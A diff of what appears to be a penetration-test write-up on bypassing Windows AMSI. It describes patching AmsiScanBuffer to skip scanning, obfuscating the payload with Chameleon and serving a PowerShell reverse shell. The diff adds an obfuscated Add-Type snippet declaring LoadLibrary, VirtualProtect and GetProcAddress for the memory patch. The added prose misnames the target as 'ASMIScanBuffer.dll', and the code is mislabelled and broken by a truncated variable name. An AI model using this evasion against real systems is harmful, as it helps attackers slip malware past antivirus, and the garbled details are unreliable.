@@ -82,12 +82,28 @@ $p = 0
 
 By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code, effectively avoiding the scanning of PowerShell code. This method allows the attacker's PowerShell code to execute without triggering AMSI's detection.
 
-However, it is essential to acknowledge that even with the aforementioned payload, AMSI might still identify the content as malicious unless proper obfuscation methodologies are implemented. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
+However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before one could patch the ASMIScanBuffer.dll itself. Thus it is necessary to implement proper obfuscation methodologies before one delivers the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
 string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.
 
 The below code snippet contains a payload that has undergone multiple layers of obfuscation.
+```bash
+$GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrNzM42Lvz0LE4IzoWJzpj7ML2MZ11evXUFDQD589KWR9QtwKq2Qg0mE6uMREzx7iRIZJOK2qLeZKpRqZslro01qcJC03aScqnLmSiSVJ6AIwZKGZF1aEaYGjS13PQyKmRdpmc2yMyISCN1yYuQCBZkF5i2LKBOpm7FcEshpWYz6QTzs9m5WNt6PONU73eoXpVQZKAbDUydPdN2ZdTeNdkOjDZHErYeh5b0Tqq9N = @"
+// thing 
+// using syStEm.CoLLeCtiONS.ArrAyLiST;
+using System; // thingssa
+using System.Runtime.InteropServices;
+public class payload {
+      [DllImport("kernel32")]
+      public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32")]
+       public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+}
+"@
+Add-Type $GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrNzM42Lvz0LE4IzoWJzpj7ML2MZ11
 
-![](/assets/AV/ob.png)  
+```
 
 
 After implementing effective obfuscation techniques, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
